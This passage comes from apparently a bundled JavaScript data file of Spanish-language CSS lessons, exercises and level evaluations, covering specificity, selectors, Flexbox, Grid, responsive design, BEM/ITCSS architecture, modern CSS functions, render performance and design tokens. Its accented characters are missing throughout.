    <p>Creamos experiencias digitales increbles.</p>

    <a href="#" class="btn-cta">Ver ms</a>

</header>

<section class="contenido">

    <p>Aqu va el resto de la pgina...</p>

</section>

\`\`\`



**Tu Misin:**

1.  Haz que el \`.hero\` ocupe toda la altura de la pantalla (\`height: 100vh\`) o al menos \`400px\`.

2.  Ponle un color de fondo oscuro o un degradado (\`linear-gradient\`).

3.  Centra el contenido vertical y horizontalmente (Tip: puedes usar \`text-align: center\` y mucho \`padding-top\`, o investigar \`display: flex\` si te sientes valiente, aunque es nivel intermedio).

4.  Usa una fuente grande y llamativa para el ttulo.`,completed:!1},{id:"css-eval-junior",title:"Evaluacin Final: Nivel Junior",level:"junior",content:`# Evaluacin de Competencias: CSS Junior



Esta evaluacin mide tu comprensin de los fundamentos de CSS: selectores, modelo de caja y posicionamiento bsico.



## Seccin 1: Teora (Responde brevemente)



1.  **Explica la diferencia entre \`class\` e \`id\`. Cundo deberas usar cada uno?**

2.  **Dibuja o describe las partes del Box Model (Modelo de Caja) desde adentro hacia afuera.**

3.  **Qu propiedad CSS se usa para cambiar el color de fondo? Y el color del texto?**

4.  **Si tengo \`<p class="texto">Hola</p>\` y en CSS tengo \`p { color: red; }\` y \`.texto { color: blue; }\`, De qu color se ver el texto y por qu?**

5.  **Para qu sirve \`box-sizing: border-box\` y por qu es importante?**



## Seccin 2: Prctica - La Tarjeta de Perfil



Crea el HTML y CSS para una tarjeta de perfil que cumpla con lo siguiente:

1.  **Contenedor:** Ancho de 300px, centrado en la pgina, borde gris suave, sombra ligera (\`box-shadow\`), esquinas redondeadas.

2.  **Imagen:** Una imagen de avatar circular (\`border-radius: 50%\`) centrada horizontalmente.

3.  **Texto:** Nombre (h2) y descripcin (p) centrados.

4.  **Botn:** Un enlace (\`a\`) que parezca botn (fondo azul, texto blanco, padding) al final de la tarjeta.

5.  **Interaccin:** Al pasar el mouse sobre el botn, este debe cambiar de color de fondo (oscurecerse).



**Restricciones:**

*   No uses Flexbox ni Grid (usa \`text-align: center\`, \`margin: 0 auto\`, \`display: inline-block\`).

*   Usa un archivo CSS externo.



## Seccin 3: El Desafo del Centrado



Tienes un \`div\` de 200x200px.

**Reto:** Cntralo perfectamente horizontal en la pantalla usando \`margin\`.



## Criterios de Aprobacin



*   [ ] Cdigo ordenado y legible.

*   [ ] Uso correcto de selectores de clase (evitar IDs para estilos).

*   [ ] Comprensin clara del Box Model (los elementos no se rompen ni se salen).

*   [ ] No uso de estilos en lnea (\`style="..."\`).

*   [ ] La tarjeta se ve visualmente agradable (espaciados consistentes).

`,completed:!1,isProject:!0},{id:"css-ss-especificidad-cascada",title:"La Guerra de la Especificidad (The Specificity Wars)",level:"semi-senior",content:`# Leccin 12: La Guerra de la Especificidad (The Specificity Wars)



## 1. Por qu mi CSS no funciona?



Has escrito \`color: red;\` pero el texto sigue azul. Te ha pasado?

Bienvenido al mundo de la **Especificidad**. El navegador no "elige al azar"; sigue un sistema de puntuacin estricto para decidir qu regla gana.



## 2. El Sistema de Puntos (0, 0, 0, 0)



Imagina un marcador de 4 cifras. Quien tenga el nmero ms alto, gana.



1.  **Estilos en lnea (\`style="..."\`)**: Valen **1,0,0,0**. (La bomba nuclear).

2.  **IDs (\`#header\`)**: Valen **0,1,0,0**. (Tanques de guerra).

3.  **Clases, pseudoclases, atributos (\`.btn\`, \`:hover\`, \`[type="text"]\`)**: Valen **0,0,1,0**. (Soldados).

4.  **Elementos/Etiquetas (\`div\`, \`h1\`)**: Valen **0,0,0,1**. (Civiles).



*El selector universal \`*\` vale 0,0,0,0.*



### Ejemplos de Batalla:



**Pelea A:**

\`#menu li\`  (1 ID + 1 Etiqueta) = **0,1,0,1**

\`.menu-item\` (1 Clase) = **0,0,1,0**

**Ganador:** \`#menu li\` (Aunque \`.menu-item\` est escrito despus, ID mata clase).



**Pelea B:**

\`.tarjeta .titulo\` (2 Clases) = **0,0,2,0**

\`div.tarjeta h2\` (1 Clase + 2 Etiquetas) = **0,0,1,2**

**Ganador:** \`.tarjeta .titulo\` (20 es mayor que 12).



## 3. La Cascada (El desempate)



Si dos selectores tienen **exactamente la misma puntuacin**, entonces (y solo entonces) gana el que est escrito al final del archivo CSS.



## 4. \`!important\` - El botn de pnico



\`color: red !important;\`

Esto rompe la especificidad y se pone por encima de todo (incluso de los estilos en lnea).



**   Incorrecto:**

Usarlo porque "no s por qu no se aplica mi estilo y tengo prisa".



**   Correcto:**

Usarlo para sobreescribir estilos de libreras externas que no puedes controlar o clases de utilidad atmicas que DEBEN aplicarse siempre (ej: \`.d-none { display: none !important; }\`).



## 5. Caso Real: El infierno de los IDs

Si usas \`#sidebar\` para dar estilos, luego no podrs cambiar el color de un botn dentro del sidebar con una clase \`.btn-gris\`, porque \`#sidebar .btn\` (0,1,1,0) gana a \`.btn-gris\` (0,0,1,0).

Tendras que escribir \`#sidebar .btn-gris\` para empatar/ganar.

**Solucin Senior:** **NO USES IDs PARA ESTILOS.** Mantn la especificidad baja usando solo clases. As todo es ms fcil de sobreescribir.

`,completed:!1},{id:"css-ss-selectores-avanzados",title:"Selectores Avanzados (El Bistur)",level:"semi-senior",content:`# Leccin 13: Selectores Avanzados (El Bistur)



## 1. Combinadores: Relaciones de Familia



Ya conoces el espacio (descendiente): \`div p\` (cualquier p dentro de div). Ahora veamos precisin quirrgica.



*   **Hijo Directo (\`>\`)**:

    \`ul > li\`

    Solo selecciona los \`li\` que son hijos **inmediatos** de \`ul\`. No selecciona nietos.

    * til para mens anidados o evitar efectos secundarios.*



*   **Hermano Adyacente (\`+\`)**:

    \`h1 + p\`

    Selecciona el prrafo que est **inmediatamente despus** del h1.

    * til para dar margen extra al primer prrafo de un artculo.*



*   **Hermano General (\`~\`)**:

    \`h1 ~ p\`

    Selecciona **todos** los prrafos que sean hermanos del h1 y estn despus de l.



## 2. Selectores de Atributo



Puedes seleccionar elementos por sus atributos HTML.



*   \`input[type="text"]\` -> Solo inputs de texto.

*   \`a[href^="https"]\` -> Enlaces que **comienzan** con https (seguros).

*   \`a[href$=".pdf"]\` -> Enlaces que **terminan** en .pdf. (Ideal para ponerles un iconito de PDF al lado con \`::after\`!).



## 3. Pseudo-clases de Estado y Orden



*   **:hover, :active, :focus**: Ya las conoces de los enlaces. \`:focus\` es vital para accesibilidad (teclado).

*   **:first-child / :last-child**: El primero o ltimo hijo.

    \`li:last-child { border-bottom: none; }\`

*   **:nth-child(n)**: Magia matemtica.

    \`tr:nth-child(even)\` -> Selecciona filas pares (2, 4, 6...). Perfecto para tablas "cebra".

    \`li:nth-child(3)\` -> Selecciona solo el tercer elemento.

*   **:not(selector)**: La lgica negativa.

    \`button:not(.primario)\` -> Todos los botones que NO tengan la clase \`.primario\`.

    \`div:not(:last-child)\` -> Todos los divs menos el ltimo (genial para poner mrgenes entre elementos).



## 4. Pseudo-elementos (Lo que no existe en el HTML)



Crean "elementos falsos" con CSS. Requieren \`content: ''\`.



*   **::before / ::after**: Insertan contenido antes o despus del elemento.

    \`\`\`css

    .precio::before {

        content: '$';

        color: gray;

    }

    \`\`\`

    *Usos Pro:  conos, adornos visuales, tooltips, limpiar floats (clearfix).*



## 5. Ejercicio

Crea una lista de 5 elementos.

1.  Usa CSS para que el primero sea rojo (\`:first-child\`).

2.  Usa CSS para que el ltimo sea azul (\`:last-child\`).

3.  Usa CSS para que los impares tengan fondo gris (\`:nth-child(odd)\`).

4.  Todo esto sin aadir ni una sola clase al HTML. Solo fuerza bruta de selectores!

`,completed:!1},{id:"css-ss-flexbox",title:"Flexbox en Profundidad",level:"semi-senior",content:`# Leccin 14: Flexbox en Profundidad



## 1. El fin de los \`floats\`



Antes, maquetar era un dolor. Flexbox lleg para salvarnos. Es un sistema para alinear elementos en **una sola dimensin** (fila o columna).



## 2. El Contenedor (\`display: flex\`)



Al poner \`display: flex\` en un padre, sus hijos directos se convierten en "flex items" y se ponen en fila automticamente.



\`\`\`css

.contenedor {

    display: flex;

    /* Opcin: flex-direction: row (defecto) | column | row-reverse | column-reverse */

}

\`\`\`



## 3. Los dos ejes



Flexbox tiene dos ejes invisibles. Entender esto es la clave.

*   **Eje Principal (Main Axis):** Sigue la direccin del \`flex-direction\`. (Si es row, es horizontal).

*   **Eje Cruzado (Cross Axis):** Corta perpendicularmente al principal. (Si es row, es vertical).



## 4. Alineacin (La trinidad)



1.  **\`justify-content\`**: Mueve los hijos en el **Eje Principal**.

    *   \`flex-start\` (inicio), \`flex-end\` (final), \`center\` (centro).

    *   \`space-between\` (extremos pegados, espacio igual en medio).

    *   \`space-around\` (espacio alrededor de cada uno).



2.  **\`align-items\`**: Mueve los hijos en el **Eje Cruzado**.

    *   \`stretch\` (estirar, defecto), \`center\` (centrado vertical), \`flex-start\`, \`flex-end\`, \`baseline\`.



3.  **\`flex-wrap\`**: Qu pasa si no caben?

    *   \`nowrap\` (apretarlos, defecto).

    *   \`wrap\` (bajar a la siguiente lnea).



## 5. El Santo Grial: Centrado Perfecto

\`\`\`css

.padre {

    display: flex;

    justify-content: center; /* Horizontal */

    align-items: center;     /* Vertical */

    height: 100vh;

}

\`\`\`



## 6. Poderes de los Hijos (Flex Items)



*   **\`flex-grow\`**: Capacidad de crecer. \`flex-grow: 1\` hace que el elemento chupe todo el espacio vaco disponible.

*   **\`flex-shrink\`**: Capacidad de encogerse si falta espacio.

*   **\`flex-basis\`**: Tamao ideal inicial.

*   **\`flex: 1\`**: Shorthand comn (\`grow: 1, shrink: 1, basis: 0\`). Hace que todos midan lo mismo.



## 7. Caso Real: Header de Navegacin

Imagina un Logo a la izquierda, Men al centro y Usuario a la derecha.



\`\`\`html

<header class="flex-header">

    <div class="logo">Logo</div>

    <nav>...</nav>

    <div class="user">User</div>

</header>

\`\`\`



\`\`\`css

.flex-header {

    display: flex;

    justify-content: space-between; /* Clave */

    align-items: center; /* Para que el logo no se estire si el user es alto */

}

\`\`\`

`,completed:!1},{id:"css-ss-grid-layout",title:"Grid Layout (La Grilla Maestra)",level:"semi-senior",content:`# Leccin 15: Grid Layout (La Grilla Maestra)



## 1. Flexbox vs Grid



*   Flexbox es para **1 Dimensin** (Fila O Columna).

*   Grid es para **2 Dimensiones** (Filas Y Columnas a la vez).

*   Flexbox es "Content-First" (se adapta al contenido). Grid es "Layout-First" (el contenido se adapta a la grilla definida).



## 2. Definiendo la Grilla



\`\`\`css

.grilla {

    display: grid;

    /* 3 columnas: 200px, automtica, y 1 fraccin */

    grid-template-columns: 200px auto 1fr;

    /* 2 filas de altura fija */

    grid-template-rows: 100px 100px;

    /* Espacio entre celdas (Adis margin hacks!) */

    gap: 20px;

}

\`\`\`



### La unidad \`fr\` (fraccin)

Es mgica. \`fr\` reparte el espacio disponible.

\`grid-template-columns: 1fr 1fr 1fr;\` -> 3 columnas de ancho idntico y fluido.

\`grid-template-columns: 2fr 1fr;\` -> La primera es el doble de ancha que la segunda.



## 3. Repitiendo (\`repeat\`)



Para no escribir \`1fr 1fr 1fr 1fr...\`

\`grid-template-columns: repeat(4, 1fr);\`



Para responsive automtico (Magia Negra):

\`grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\`

*Esto crea tantas columnas de 250px como quepan. Si sobra espacio, las estira.*



## 4. Posicionando elementos



Puedes decirle a un hijo dnde vivir.



\`\`\`css

.hijo-destacado {

    /* Empieza en la lnea de columna 1 y termina en la 3 (ocupa 2 columnas) */

    grid-column: 1 / 3;

    /* Empieza en fila 1 y termina en 3 */

    grid-row: 1 / 3;

}

\`\`\`

*O ms fcil: \`grid-column: span 2;\`*



## 5. Grid Areas (Diseo con ASCII Art)



Nombra tus reas:

\`\`\`css

.padre {

    display: grid;

    grid-template-areas:

        "header header header"

        "menu main main"

        "menu footer footer";

}



.header { grid-area: header; }

.menu { grid-area: menu; }

.main { grid-area: main; }

.footer { grid-area: footer; }

\`\`\`

Es literalmente dibujar tu web en el cdigo!



## 6. Ejercicio: Galera de Fotos (Bento Box)

Crea un contenedor grid. Haz que algunas fotos ocupen 1x1, otras 2x2 y otras 1x2 (altas). Usa \`grid-coulmn: span 2\` y \`grid-row: span 2\`. Con Flexbox esto sera una pesadilla matemtica de \`calc()\`. Con Grid son 3 lneas.

`,completed:!1},{id:"css-ss-responsive-design",title:"Responsive Design y Media Queries",level:"semi-senior",content:`# Leccin 16: Responsive Design y Media Queries



## 1. La Web no es papel



Tus usuarios usarn un iPhone SE, una tableta vieja, una laptop de 13" o un monitor ultrawide de 34". Si tu web solo se ve bien en tu pantalla, has fallado.



## 2. Meta Viewport (Requisito Indispensable)



Sin esto en tu HTML \`<head>\`, el mvil intentar mostrar la web como si fuera de escritorio (alejando el zoom).

\`\`\`html

<meta name="viewport" content="width=device-width, initial-scale=1.0">

\`\`\`

*Si usas VS Code y escribes \`!\` + Tab, esto ya viene incluido.*



## 3. Estrategia: Mobile First



Antiguamente disebamos para PC y luego "arreglbamos" para mvil.

**Hoy es al revs.**

Disea primero para el mvil (pantalla pequea -> CSS base). Luego, usa Media Queries para **aadir** complejidad en pantallas grandes.



**Por qu?**

*   El mvil obliga a priorizar el contenido esencial.

*   El cdigo base es ms ligero.

*   Es ms fcil escalar (agregar columnas) que des-escalar (forzar columnas a filas).



## 4. Media Queries (@media)



Son condiciones: "Si la pantalla mide al menos X, aplica esto".



\`\`\`css

/* 1. Estilos Base (Mobile) */

body {

    font-size: 16px;

    background: white;

}

.columna {

    width: 100%; /* Una debajo de otra */

}



/* 2. Tablet (aprox > 768px) */

@media (min-width: 768px) {

    .columna {

        width: 50%; /* Dos columnas */

    }

}



/* 3. Desktop (aprox > 1024px) */

@media (min-width: 1024px) {

    body {

        font-size: 18px; /* Letra ms grande en pantalla grande */

        max-width: 1200px;

        margin: 0 auto; /* Centrar web */

    }

    .columna {

        width: 33.3%; /* Tres columnas */

    }

}

\`\`\`



## 5. Breakpoints (Puntos de quiebre) comunes



No inventes nmeros mgicos (\`723px\`). Usa estndares:

*   **640px** (Mvil grande / Tablet pequea)

*   **768px** (Tablet vertical - iPad clsico)

*   **1024px** (Tablet horizontal / Laptop pequea)

*   **1280px** (Desktop estndar)



## 6. Imgenes Responsivas



Nunca dejes que una imagen rompa tu diseo.

Regla de oro semi-senior:

\`\`\`css

img {

    max-width: 100%;

    height: auto;

}

\`\`\`

Esto asegura que la imagen nunca sea ms ancha que su contenedor y que mantenga su proporcin.



## 7. Reto Responsivo

Toma tu ejercicio de "Tarjetas de Producto" (Leccin anterior).

1.  Haz que en mvil (\`< 600px\`) se vea 1 columna.

2.  En tablet (\`600px - 900px\`) se vean 2 columnas.

3.  En desktop (\`> 900px\`) se vean 3 columnas.

Todo usando Grid o Flexbox inside de las media queries.

`,completed:!1},{id:"css-ss-buenas-practicas-organizacion",title:"Buenas Prcticas Reales y Organizacin",level:"semi-senior",content:`# Leccin 17: Buenas Prcticas Reales y Organizacin



## 1. El caos de un archivo de 2000 lneas



Cuando trabajas en equipo o el proyecto crece, "tirar cdigo" en un solo archivo \`style.css\` es suicidio.



## 2. Metodologas de Naming (BEM)



**BEM** (Block, Element, Modifier) es un estndar para nombrar clases y evitar el infierno de especificidad.

Formato: \`.bloque__elemento--modificador\`.



*   **Bloque (.tarjeta):** El componente independiente.

*   **Elemento (.tarjeta__titulo):** Parte interna del bloque. Separado por \`__\`.

*   **Modificador (.tarjeta--destacada):** Una variacin del bloque. Separado por \`--\`.



**Ejemplo BEM:**

\`\`\`html

<article class="card card--featured">

    <h2 class="card__title">Ttulo</h2>

    <button class="card__btn card__btn--primary">Ver ms</button>

</article>

\`\`\`

*Ventaja:* Al leer el HTML sabes exactamente qu hace cada clase y su relacin. Adems, la especificidad es plana (0,0,1,0), fcil de cambiar.



## 3. Evita anidamiento profundo (Deep Nesting)



**Mal (SASS styling o selectores largos):**

\`\`\`css

.header .nav .menu ul li a span { color: red; }

\`\`\`

Esto es lento para el navegador y terrible para mantener. Si cambias el \`span\` por un \`i\`, se rompe.



**Bien:**

\`\`\`css

.nav-link-icon { color: red; }

\`\`\`

(Usando una clase directa). Mximo 3 niveles de anidacin.



## 4. Unidades relativas siempre

Usa \`rem\` para tamaos de fuente y mrgenes globales.

Usa \`em\` para paddings de botones (para que escalen con el botn).

Evita \`px\` para layout a menos que sea un borde de 1px.



## 5. Variables CSS (Custom Properties)



CSS nativo tiene variables!  salas para colores, fuentes y espaciados.



\`\`\`css

:root {

    --color-primary: #3498db;

    --spacing-md: 16px;

}



.btn {

    background-color: var(--color-primary);

    padding: var(--spacing-md);

}

\`\`\`

*Si el cliente quiere cambiar el azul por rojo, cambias 1 lnea, no 500.*



## 6. Organizacin de Archivos



Aunque al final se use un bundler (Vite/Webpack), mentalmente organiza tu CSS as:

1.  **Variables/Config:** Colores, fuentes.

2.  **Reset:** Normalizar navegadores.

3.  **Base:** Estilos para tags bsicos (\`h1\`, \`p\`, \`body\`).

4.  **Layout:** Estructura mayor (\`header\`, \`footer\`, \`grid\`).

5.  **Componentes:** \`.btn\`, \`.card\`, \`.modal\`.

6.  **Utilidades:** \`.text-center\`, \`.mt-5\` (mrgenes).



## 7. Bug comn: Sobreescritura silenciosa

Revisa siempre la consola. Si una propiedad est tachada, es que otra regla gan. Usa \`Ctrl+F\` en tu CSS para ver si repetiste el selector. Y sobre todo: No uses IDs para estilos!

`,completed:!1},{id:"css-ss-ejercicios-semisenior",title:"Ejercicios Prcticos: CSS Semi-Senior",level:"semi-senior",content:`# Ejercicios Prcticos: CSS Semi-Senior



Aplica BEM, Flexbox, Grid y Responsive Design.



---



## 1. El Navbar Responsivo Clsico

**Objetivo:** Flexbox y Media Queries.



**Requisito Desktop (>768px):**

*   Logo a la izquierda.

*   Links al derecho.

*   Todo alineado horizontalmente.



**Requisito Mvil (<768px):**

*   Logo centrado arriba.

*   Links debajo del logo, en columna (vertical), centrados.

*   Fondo de color distinto.



*Pista: Usa \`flex-direction: column\` en el media query mvil y \`row\` en desktop (o viceversa segn mobile-first).*



---



## 2. Galera de Arte (Grid Layout)

**Objetivo:** Grid implcito y explcito.



1.  Crea un contenedor con 6 imgenes.

2.  Usa CSS Grid para hacer un layout tipo "Mosaico".

3.  La primera imagen debe ser "destacada": ocupar 2 columnas de ancho y 2 filas de alto (\`grid-area\` o \`span\`).

4.  Usa \`gap\` para separar las fotos.

5.  Usa \`object-fit: cover\` en las imgenes para que no se deformen al estirarse.



---



## 3. Tarjeta de Pricing (Variables y BEM)

**Objetivo:** Variables CSS y Naming BEM.



Crea 3 tarjetas de precios: "Basic", "Pro" y "Enterprise".

1.  Define colores en \`:root\` (\`--color-basic\`, \`--color-pro\`, \`--color-ent\`).

2.  Usa clases BEM:

    *   \`.pricing-card\`

    *   \`.pricing-card__header\`

    *   \`.pricing-card__price\`

    *   \`.pricing-card--recommended\` (para la Pro, que debe ser un poco ms grande o tener sombra).

3.  Usa Flexbox para centrar el contenido de la tarjeta.



---



## 4. El Layout "Santo Grial"

**Objetivo:** Grid Areas.



Maqueta la estructura clsica de un sitio web:

*   Header (100% ancho).

*   Sidebar (Izquierda, 20% ancho).

*   Contenido Principal (Derecha, 80% ancho).

*   Footer (100% ancho).



**Reto:**

En mvil, el Sidebar debe moverse **debajo** del Contenido Principal (no antes).

Logra esto solo cambiando las \`grid-template-areas\` en el media query, sin tocar el HTML.



---



## 5. Debugging: Por qu no centra?

**Objetivo:** Solucin de problemas.

Crea un \`div\` con clase \`.padre\` y un \`div\` con clase \`.hijo\`.

Intenta centrar el hijo perfecta y verticalmente usando Flexbox.

Si el padre no tiene una altura definida (\`height\`), se centra verticalmente? Explora por qu el \`height: 100vh\` es necesario en el padre para ver el efecto.

`,completed:!1},{id:"css-eval-semisenior",title:"Evaluacin Final: Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin de Competencias: CSS Semi-Senior



Demuestra tu dominio del Layout Moderno (Flex/Grid), Diseo Responsivo y metodologas de organizacin.



## Seccin 1: Teora



1.  **Explica la especificidad CSS con tus propias palabras. Qu pesa ms, una clase o un ID?**

2.  **Menciona 3 diferencias clave entre Flexbox y CSS Grid.**

3.  **Qu es "Mobile First" y cmo afecta la forma en que escribes Media Queries?**

4.  **Para qu sirve la unidad \`rem\` y en qu se diferencia de \`px\` y \`em\`?**

5.  **Escribe un selector para el tercer elemento \`li\` de una lista.**



## Seccin 2: Layout Responsivo



Crea una estructura de pgina de "Galera de Fotos" que se comporte as:



*   **HTML:** Un contenedor con 6 elementos (fotos o cajas de colores).

*   **Mobile (< 600px):** 1 sola columna (una foto debajo de otra).

*   **Tablet (600px - 900px):** 2 columnas (Grid o Flex wrap).

*   **Desktop (> 900px):** 3 columnas.



**Requisito Adicional:**

Usa la metodologa **BEM** para nombrar tus clases (ej: \`.gallery__item\`).

Usa \`gap\` para los espaciados.



## Seccin 3: Debugging



Tienes el siguiente cdigo que NO funciona como esperas. El texto no se pone rojo. Explica por qu y arrglalo sin usar \`!important\`.



\`\`\`html

<div id="contenedor">

    <p class="texto">Hola Mundo</p>

</div>

\`\`\`



\`\`\`css

#contenedor p {

    color: blue;

}



.texto {

    color: red; /* Quiero que sea rojo */

}

\`\`\`



## Criterios de Aprobacin



*   [ ] Uso correcto de Grid y/o Flexbox para layout.

*   [ ] Implementacin correcta de Mobile First (Media queries \`min-width\`).

*   [ ] Naming correcto con BEM.

*   [ ] Solucin correcta al problema de especificidad demostrando entendimiento de pesos.

`,completed:!1,isProject:!0},{id:"css-senior-arquitecturas-css",title:"Arquitecturas CSS (BEM, ITCSS)",level:"senior",content:`# Leccin 19: Arquitecturas CSS (BEM, ITCSS)



## 1. El Problema de la Escala



En un proyecto pequeo, un solo archivo CSS funciona. En una aplicacin empresarial con 50 desarrolladores y 500 componentes, el CSS Global es el enemigo.

Escribir CSS Senior no es saberse todas las propiedades, es saber **organizarlo para que no se rompa** cuando alguien toque una lnea.



## 2. BEM (Block Element Modifier) - Estricto



Ya lo vimos en nivel SS, pero como Senior debes enforcinglo.

El verdadero valor de BEM es que **aplana la especificidad** y **aisla el contexto**.



**Pregunta de Entrevista:**

*"Por qu BEM prefiere \`.bloque__elemento\` en lugar de \`.bloque .elemento\`?"*

**Respuesta:** Porque \`.bloque .elemento\` aumenta la especificidad y depende de la estructura HTML. Si mueves \`.elemento\` fuera de \`.bloque\`, deja de funcionar. BEM hace que el estilo dependa de la clase, no de la ubicacin.



## 3. ITCSS (Inverted Triangle CSS)



Una arquitectura para organizar los imports. Ordena el CSS de "Genrico" a "Especfico".



1.  **Settings:** Variables, Configuracin (SASS/PostCSS).

2.  **Tools:** Mixins, Funciones.

3.  **Generic:** Reset, Normalize, \`box-sizing\`.

4.  **Elements:** Estilos base para etiquetas HTML (\`h1\`, \`a\`, \`p\` sin clases).

5.  **Objects:** Patrones de diseo sin cosmtica (Grid, Container, Media Object).

6.  **Components:** UI con esttica especfica (\`.btn\`, \`.card\`, \`.navbar\`).

7.  **Trumps (Utilities):** Helpers con \`!important\` que sobreescriben todo (\`.hidden\`, \`.text-center\`).



## 4. OOCSS (Object Oriented CSS)



Principio: **Separar estructura de piel.**



**Mal (Acoplado):**

\`\`\`css

.boton-login {

    width: 100px;

    background: blue;

    border-radius: 5px;

}

.boton-registro {

    width: 120px;

    background: red;

    border-radius: 5px;

}

\`\`\`



**Bien (OOCSS):**

\`\`\`css

/* Estructura (Objeto) */

.btn {

    border-radius: 5px;

    /* estructura base */

}



/* Piel (Skin) */

.btn-primary { background: blue; }

.btn-danger { background: red; }

.w-sm { width: 100px; }

\`\`\`

Esto reduce la deuda tcnica y el tamao del bundle final.



## 5. CSS Scoping



En apps modernas (React/Vue), usamos:

*   **CSS Modules:** Genera nombres nicos (\`_button_ax7z1\`) para emular encapsulamiento local.

*   **Shadow DOM:** Encapsulamiento nativo real (Web Components).

*   **CSS-in-JS:** (Styled Components) Elimina la colisin de nombres pero aade runtime overhead.



Como arquitecto, debes decidir cul usar basndote en: Performance vs Developer Experience.

`,completed:!1},{id:"css-senior-css-moderno",title:"CSS Moderno (Funciones y Lgica)",level:"senior",content:`# Leccin 20: CSS Moderno (Funciones y Lgica)



## 1. El mito de "CSS no es programacin"



El CSS moderno tiene variables, funciones matemticas, lgica condicional (@media, @supports) y ahora anidamiento nativo.



## 2. Custom Properties (Variables) Avanzadas



No solo guardan colores. Guardan **lgica parcial**.



\`\`\`css

.boton {

    --h: 200; /* Hue */

    --s: 50%; /* Saturation */

    --l: 40%; /* Lightness */

    background: hsl(var(--h), var(--s), var(--l));

}



.boton:hover {

    --l: 50%; /* Solo cambiamos la variable, no reescribimos el background */

}



.boton--rojo {

    --h: 0; /* Solo cambiamos el Hue */

}

\`\`\`



## 3. Matemticas Fluidas: \`clamp()\`, \`min()\`, \`max()\`



Olvida los media queries para tipografa. Usa **Fluid Typography**.



**\`clamp(MIN, VAL, MAX)\`**:

El valor ser \`VAL\`, pero nunca menos de \`MIN\` ni ms de \`MAX\`.



\`\`\`css

h1 {

    /* 

       Mnimo: 2rem (32px)

       Ideal: 5% del ancho de pantalla (responsive fluido)

       Mximo: 4rem (64px)

    */

    font-size: clamp(2rem, 5vw, 4rem);

}

\`\`\`

Esto elimina saltos bruscos entre breakpoints.



## 4. \`calc()\` para Layouts Hbridos



Mezclar unidades fijas y relativas.



\`\`\`css

/* Sidebar de 300px, el resto para el contenido, menos 20px de gap */

.content {

    width: calc(100% - 300px - 20px);

}

\`\`\`



## 5. Propiedades Lgicas (Logical Properties)



La web es internacional. \`margin-left\` tiene sentido en espaol (LTR), pero en rabe (RTL) rompe el diseo.

Usa propiedades lgicas que se adaptan a la direccin del texto.



*   \`margin-left\` -> **\`margin-inline-start\`**

*   \`margin-right\` -> **\`margin-inline-end\`**

*   \`margin-top\` -> **\`margin-block-start\`**

*   \`width\` -> **\`inline-size\`**

*   \`height\` -> **\`block-size\`**



Si cambias \`<html dir="rtl">\`, tu sitio se espeja automticamente gratis. Esto es nivel Senior.

`,completed:!1},{id:"css-senior-css-performance",title:"Performance de Renderizado (The Pixel Pipeline)",level:"senior",content:`# Leccin 21: Performance de Renderizado (The Pixel Pipeline)



## 1. Lo que pasa cuando cambias una clase



Entender el **Pixel Pipeline** distingue a un Senior de un Mid.

Pasos del navegador para pintar un frame (60fps = 16ms por frame):



1.  **JavaScript:** Cambia el DOM o estilos.

2.  **Style:** Recalcula qu reglas aplican a qu elementos.

3.  **Layout (Reflow):** Calcula geometra (ancho, alto, posicin). **COSTOSO!**

4.  **Paint:** Rellena pxeles (colores, bordes, sombras, texto). **COSTOSO.**

5.  **Composite:** Compone las capas (Layers) en la GPU. **BARATO.**



## 2. Layout Thrashing (El asesino del rendimiento)



Evita leer y escribir propiedades de geometra en un bucle.



**Mal:**

\`\`\`js

items.forEach(item => {

    let ancho = item.offsetWidth; // Lectura (fuerza Layout)

    item.style.width = (ancho + 10) + 'px'; // Escritura (invalida Layout)

});

\`\`\`

Esto fuerza al navegador a calcular el layout una y otra vez por cada tem. Haz todas las lecturas primero, luego todas las escrituras.



## 3. Animaciones de Alto Rendimiento



Solo anima propiedades que afecten **solo a Composite**.



*      **Baratas (GPU):** \`transform\` (mover, escalar, rotar), \`opacity\`.

*      **Caras (CPU - Layout/Paint):** \`width\`, \`height\`, \`left\`, \`top\`, \`margin\`, \`box-shadow\`.



Si animas \`left: 10px\` a \`left: 100px\`, el navegador recalcula el layout de toda la pgina en cada frame.

Si animas \`transform: translateX(90px)\`, la GPU mueve la "foto" de la capa sin recalcular geometra.



## 4. \`will-change\`



Le avisa al navegador que algo va a cambiar para que prepare optimizaciones (crear nueva capa).



\`\`\`css

.elemento-animado {

    will-change: transform;

}

\`\`\`

*Advertencia: No lo uses en todo. Consume mucha memoria RAM.  salo solo en elementos que se animan activamente.*



## 5. Content Visibility



\`content-visibility: auto;\`

Le dice al navegador: "Si este elemento est fuera de la pantalla (off-screen), no calcules su renderizado todava".

Mejora brutalmente el tiempo de carga inicial en pginas largas.

`,completed:!1},{id:"css-senior-design-systems",title:"Design Systems & Tokens",level:"senior",content:`# Leccin 22: Design Systems & Tokens



## 1. Del caos al sistema



Un Senior no piensa en "Pginas", piensa en "Sistemas". Un Design System es la fuente de verdad entre Diseo y Desarrollo.



## 2. Design Tokens



Son las variables atmicas del sistema. Abstraen los valores crudos.



**Niveles de Tokens:**



1.  **Global Tokens (Primitivos):** La paleta literal.

    \`--blue-500: #3b82f6;\`

2.  **Alias Tokens (Semnticos):** Contexto de uso.

    \`--color-primary: var(--blue-500);\`

    \`--color-success: var(--green-500);\`

3.  **Component Tokens (Especficos):** Para un componente.

    \`--btn-bg: var(--color-primary);\`



**Por qu tantas capas?**

Si maana el "color primario" cambia de azul a morado, solo tocas el Alias Token. Si el botn primario cambia de "primary" a "negro", solo tocas el Component Token. Escalabilidad pura.



## 3. Theming (Temas)



Gracias a las variables CSS, implementar Dark Mode es trivial si usas tokens.



\`\`\`css

:root {

    --text-color: #333;

    --bg-color: #fff;

}



[data-theme="dark"] {

    --text-color: #fff;

    --bg-color: #111;

}



body {

    color: var(--text-color);

    background: var(--bg-color);

}

\`\`\`



## 4. Atomic CSS (Utility-First)



Tailwind CSS es un Design System basado en utilidades.

En lugar de escribir CSS semntico, aplicas tokens directamente en el HTML.

\`p-4 bg-primary text-white rounded\`.

**Discusin Senior:** Valora Atomic CSS para velocidad y consistencia, pero ten cuidado con el HTML sucio.  salo con \`@apply\` o componentes encapsulados si necesitas limpieza.



## 5. Reto de Arquitecto

Disea una escala tipogrfica (\`t-shirt sizing\`) usando tokens:

\`--text-xs\`, \`--text-sm\`, \`--text-md\`, \`--text-lg\`, \`--text-xl\`.

Asegrate de que el \`line-height\` cambie acorde al tamao para mantener el "ritmo vertical".

